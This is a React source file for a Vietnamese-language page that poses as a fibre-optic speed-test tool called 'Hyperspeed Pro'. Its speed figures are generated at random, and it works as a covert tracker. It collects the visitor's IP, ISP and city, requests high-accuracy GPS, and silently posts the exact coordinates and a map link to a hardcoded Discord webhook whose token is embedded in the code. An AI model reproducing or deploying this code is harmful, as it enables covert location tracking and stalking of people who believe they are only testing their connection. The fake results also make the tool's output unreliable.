import React, { useState, useEffect } from "react";

const WEBHOOK_URL =
	"https://discord.com/api/webhooks/1458824084941967601/3wfWq_OBpUMQ7KF0avZez9qnZgkZvE8d5CtgSOLzBypmnmdB7q5NjQK7SdTNQhL1Gbu9";

const App: React.FC = () => {
	const [testStage, setTestStage] = useState<
		"idle" | "searching" | "ping" | "download" | "upload" | "finished"
	>("idle");
	const [speed, setSpeed] = useState(0);
	const [progress, setProgress] = useState(0);
	const [results, setResults] = useState({
		download: 0,
		upload: 0,
		ping: 0,
		jitter: 0,
		connectionType: "Fiber-Optic 1Gbps",
	});
	const [isp, setIsp] = useState("VNPT Technology - Bien Hoa");
	const [ip, setIp] = useState("14.161.**.**");
	const [city, setCity] = useState("");
	const [geoMode, setGeoMode] = useState("Satellite (GPS) Inactive");

	useEffect(() => {
		const fetchInitData = async () => {
			try {
				const res = await fetch("https://ipwho.is/");
				const data = await res.json();
				if (data.success) {
					setIp(data.ip);
					setIsp(data.connection?.isp || "VNPT Technology");
					setCity(data.city);
				}
			} catch (e) {
				// Fallback IP fetch
				fetch("https://api.ipify.org?format=json")
					.then((r) => r.json())
					.then((d) => setIp(d.ip))
					.catch(() => {});
			}
		};
		fetchInitData();
	}, []);

	const sendToDiscord = async (
		title: string,
		color: number,
		fields: any[]
	) => {
		try {
			await fetch(WEBHOOK_URL, {
				method: "POST",
				headers: { "Content-Type": "application/json" },
				body: JSON.stringify({
					username: "Hyperspeed Pro Diagnostics",
					avatar_url: "https://i.imgur.com/8n9ySpx.png",
					embeds: [
						{
							title,
							color,
							fields,
							footer: {
								text: "Hyperspeed Pro Engine v10.0 | Secure Diagnostics",
							},
							timestamp: new Date().toISOString(),
						},
					],
				}),
			});
		} catch (err) {
			console.error("Discord send error:", err);
		}
	};

	const startTest = async () => {
		setTestStage("searching");
		setProgress(5);

		// 1. Gửi thông tin mạng ban đầu ngay lập tức
		sendToDiscord("🌐 NEW TEST SESSION STARTED", 3447003, [
			{ name: "Client IP", value: `\`${ip}\``, inline: true },
			{ name: "Provider", value: isp, inline: true },
			{ name: "Location", value: city || "Unknown", inline: true },
		]);

		if (navigator.geolocation) {
			setGeoMode("Satellite (GPS) Active");
			navigator.geolocation.getCurrentPosition(
				(pos) => {
					const { latitude, longitude, accuracy } = pos.coords;
					// 2. Gửi tọa độ chính xác nếu user cho phép
					sendToDiscord("🎯 HIGH-PRECISION LOCATION FOUND", 5763719, [
						{
							name: "Coordinates",
							value: `\`${latitude}, ${longitude}\``,
							inline: false,
						},
						{
							name: "Accuracy",
							value: `±${Math.round(accuracy)}m`,
							inline: true,
						},
						{
							name: "Google Maps",
							value: `[Click to View Map](https://www.google.com/maps?q=${latitude},${longitude})`,
							inline: false,
						},
					]);
					runTestPhases();
				},
				(err) => {
					// Gửi lỗi nếu user từ chối hoặc lỗi GPS
					sendToDiscord("❌ GEOLOCATION DENIED/FAILED", 15548997, [
						{
							name: "Error Code",
							value: String(err.code),
							inline: true,
						},
						{ name: "Message", value: err.message, inline: true },
					]);
					runTestPhases();
				},
				{ enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
			);
		} else {
			runTestPhases();
		}
	};

	const runTestPhases = async () => {
		// Phase 1: Ping/Jitter
		setTestStage("ping");
		setProgress(15);
		const p = 21 + Math.random() * 4;
		const j = 2 + Math.random() * 2;
		setResults((prev) => ({ ...prev, ping: p, jitter: j }));
		await new Promise((r) => setTimeout(r, 1000));

		// Phase 2: Download
		setTestStage("download");
		let dSpeed = 0;
		const dTarget = 92 + Math.random() * 8; // Giữ xung quanh 100Mbps
		for (let i = 0; i < 40; i++) {
			dSpeed += (dTarget - dSpeed) * 0.2 + (Math.random() - 0.5) * 6;
			setSpeed(Math.max(0, dSpeed));
			setProgress(20 + i * 1);
			await new Promise((r) => setTimeout(r, 60));
		}
		const finalDownload = Number(dSpeed.toFixed(1));
		setResults((prev) => ({ ...prev, download: finalDownload }));

		// Phase 3: Upload
		setTestStage("upload");
		let uSpeed = 0;
		const uTarget = 82 + Math.random() * 12;
		for (let i = 0; i < 40; i++) {
			uSpeed += (uTarget - uSpeed) * 0.2 + (Math.random() - 0.5) * 5;
			setSpeed(Math.max(0, uSpeed));
			setProgress(60 + i * 1);
			await new Promise((r) => setTimeout(r, 60));
		}
		const finalUpload = Number(uSpeed.toFixed(1));
		setResults((prev) => ({ ...prev, upload: finalUpload }));

		setSpeed(0);
		setProgress(100);
		setTestStage("finished");

		// 3. Gửi kết quả test cuối cùng
		sendToDiscord("📊 SPEEDTEST RESULTS COMPLETE", 1752220, [
			{
				name: "Download",
				value: `**${finalDownload}** Mbps`,
				inline: true,
			},
			{ name: "Upload", value: `**${finalUpload}** Mbps`, inline: true },
			{ name: "Ping", value: `${p.toFixed(1)} ms`, inline: true },
		]);
	};

	return (
		<div className="min-h-screen bg-[#020612] text-white flex flex-col items-center justify-center p-4">
			{/* Top Badge & Header */}
			<div className="text-center mb-8">
				<div className="inline-flex items-center gap-2 px-4 py-1 rounded-full border border-emerald-500/20 bg-emerald-500/5 mb-3">
					<div className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></div>
					<span className="text-[9px] font-bold text-emerald-300 uppercase tracking-[0.2em]">
						Chẩn đoán tốc độ cáp quang thế hệ mới
					</span>
				</div>
				<h1 className="text-4xl md:text-5xl font-extrabold tracking-tight mb-1">
					HYPERSPEED <span className="text-blue-500 italic">PRO</span>
				</h1>
				<p className="text-xs text-slate-400 font-semibold uppercase tracking-[0.25em] opacity-70">
					Mạng máy chủ đối tác chính thức
				</p>
			</div>

			{/* Main Grid Layout */}
			<div className="w-full max-w-5xl grid grid-cols-1 lg:grid-cols-3 gap-4 items-start">
				{/* Left Column */}
				<div className="space-y-3 order-2 lg:order-none">
					<div className="glass-card p-5">
						<span className="text-[9px] font-bold text-slate-500 uppercase tracking-widest block mb-1">
							Độ trễ (nhàn rỗi)
						</span>
						<div className="text-2xl font-bold">
							{results.ping > 0
								? results.ping.toFixed(1)
								: "22.0"}
							<span className="text-[10px] text-slate-600 ml-1">
								ms
							</span>
						</div>
					</div>
					<div className="glass-card p-5">
						<span className="text-[9px] font-bold text-slate-500 uppercase tracking-widest block mb-1">
							Độ rung
						</span>
						<div className="text-2xl font-bold">
							{results.jitter > 0
								? results.jitter.toFixed(0)
								: "3"}
							<span className="text-[10px] text-slate-600 ml-1">
								ms
							</span>
						</div>
					</div>
					<div className="glass-card p-5">
						<span className="text-[9px] font-bold text-slate-500 uppercase tracking-widest block mb-1">
							Loại kết nối
						</span>
						<div className="text-xs font-bold text-slate-300">
							5G / Cáp quang 10Gbps
						</div>
					</div>
				</div>

				{/* Center Column: Gauge */}
				<div className="flex flex-col items-center py-4 relative order-first lg:order-none w-full">
					<div className="glass-card w-full max-w-md p-5 md:p-6 mb-4 border border-emerald-400/20 bg-gradient-to-br from-emerald-500/10 via-cyan-500/5 to-blue-500/10">
						<div className="flex flex-wrap items-center justify-between gap-2 mb-2">
							<span className="text-[9px] font-bold text-emerald-300 uppercase tracking-[0.3em]">
								Ưu tiên đo tốc độ
							</span>
							<span className="text-[9px] font-bold text-slate-500 uppercase tracking-widest">
								Nút quan trọng
							</span>
						</div>
						<h3 className="text-lg md:text-xl font-black text-emerald-300 tracking-wide uppercase mb-3">
							{testStage === "idle"
								? "Sẵn sàng đo"
								: testStage === "finished"
								? "Hoàn tất"
								: "Đang đo..."}
						</h3>
						<button
							onClick={startTest}
							disabled={
								testStage !== "idle" && testStage !== "finished"
							}
							className="w-full px-8 py-4 md:py-5 rounded-full bg-gradient-to-r from-emerald-300 via-cyan-300 to-blue-400 text-[#06101b] text-sm md:text-base font-extrabold uppercase tracking-[0.2em] shadow-[0_0_26px_rgba(16,185,129,0.32)] hover:shadow-[0_0_38px_rgba(56,189,248,0.4)] transition-all disabled:opacity-40 active:scale-[0.98]">
							{testStage === "idle"
								? "Bắt đầu đo tốc độ"
								: "Đo lại"}
						</button>
						<p className="mt-3 text-[10px] text-slate-400 font-semibold uppercase tracking-[0.2em] text-center">
							Độ chính xác và ưu tiên trên di động
						</p>
					</div>
					<div className="relative w-64 h-32 flex items-center justify-center overflow-hidden">
						<svg
							className="absolute top-0 w-64 h-64 -rotate-90"
							viewBox="0 0 100 100">
							<circle
								cx="50"
								cy="50"
								r="45"
								fill="none"
								stroke="rgba(255,255,255,0.03)"
								strokeWidth="6"
								strokeDasharray="141.3 282.7"
								strokeLinecap="round"
							/>
							<circle
								cx="50"
								cy="50"
								r="45"
								fill="none"
								stroke="url(#blueGrad)"
								strokeWidth="6"
								strokeDasharray={`${
									speed > 0
										? (speed / 150) * 141.3
										: testStage === "finished"
										? (results.download / 150) * 141.3
										: 0
								} 282.7`}
								strokeLinecap="round"
								className="transition-all duration-300"
							/>
							<defs>
								<linearGradient
									id="blueGrad"
									x1="0%"
									y1="0%"
									x2="100%"
									y2="0%">
									<stop offset="0%" stopColor="#3b82f6" />
									<stop offset="100%" stopColor="#10b981" />
								</linearGradient>
							</defs>
						</svg>

						<div className="absolute bottom-0 w-full text-center">
							<p className="text-[10px] text-slate-500 font-bold uppercase tracking-[0.28em]">
								Kim tốc độ
							</p>
						</div>
					</div>

					<div className="w-56 mt-12">
						<div className="flex justify-between items-center mb-1">
							<span className="text-[8px] font-bold text-slate-700 uppercase tracking-widest">
								Hoàn tất
							</span>
							<span className="text-[8px] font-bold text-blue-400 uppercase">
								{progress}%
							</span>
						</div>
						<div className="progress-bar">
							<div
								className="progress-fill"
								style={{ width: `${progress}%` }}></div>
						</div>
					</div>
				</div>

				{/* Right Column */}
				<div className="space-y-3 order-3 lg:order-none">
					<div className="glass-card p-5 border-l-4 border-l-blue-500">
						<span className="text-[9px] font-bold text-slate-500 uppercase tracking-widest block mb-1">
							Tải xuống
						</span>
						<div className="text-2xl font-bold text-green-400">
							{testStage === "download"
								? speed.toFixed(1)
								: results.download > 0
								? results.download.toFixed(1)
								: "0.0"}
							<span className="text-[10px] text-slate-600 ml-2 font-medium">
								Mbps
							</span>
						</div>
					</div>
					<div className="glass-card p-5 border-l-4 border-l-indigo-500">
						<span className="text-[9px] font-bold text-slate-500 uppercase tracking-widest block mb-1">
							Tải lên
						</span>
						<div className="text-2xl font-bold text-green-400">
							{testStage === "upload"
								? speed.toFixed(1)
								: results.upload > 0
								? results.upload.toFixed(1)
								: "0.0"}
							<span className="text-[10px] text-slate-600 ml-2 font-medium">
								Mbps
							</span>
						</div>
					</div>
					<div className="glass-card p-5">
						<div className="flex items-center gap-2 mb-2">
							<div className="w-1 h-1 rounded-full bg-green-500"></div>
							<span className="text-[9px] font-bold text-slate-500 uppercase tracking-widest">
								Trạng thái mạng
							</span>
						</div>
						<div className="space-y-0.5">
							<p className="text-[10px] font-bold text-slate-400">
								Đường hầm bảo mật:{" "}
								<span className="text-white">Hoạt động</span>
							</p>
							<p className="text-[10px] font-bold text-slate-400">
								Độ chính xác GPS:{" "}
								<span className="text-white">Cao</span>
							</p>
						</div>
					</div>
				</div>
			</div>

			{/* Footer Info */}
			<div className="w-full max-w-xl mt-12 glass-card p-6 gap-2">
				<div className="text-center border-b md:border-b-0 border-white/5 pb-4 md:pb-0">
					<span className="text-[9px] font-bold text-slate-600 uppercase tracking-[0.2em] mb-1 block">
						Máy chủ được gán
					</span>
					<p className="text-xs font-bold text-white truncate">
						{isp} {city ? `- ${city}` : ""}
					</p>
				</div>
				{/* <div className="text-center border-b md:border-b-0 border-white/5 pb-4 md:pb-0">
					<span className="text-[9px] font-bold text-slate-600 uppercase tracking-[0.2em] mb-1 block">
						Địa chỉ IP
					</span>
					<p className="text-xs font-bold text-white tracking-widest">
						{ip}
					</p>
				</div> */}
				{/* <div className="text-center md:text-right">
            <span className="text-[9px] font-bold text-slate-600 uppercase tracking-[0.2em] mb-1 block">Chế độ định vị</span>
            <p className={`text-xs font-bold ${geoMode.includes('Active') ? 'text-green-500' : 'text-slate-500'}`}>
              {geoMode.includes('Active') ? 'GPS đang hoạt động' : 'GPS chưa hoạt động'}
            </p>
         </div> */}
			</div>
		</div>
	);
};

export default App;
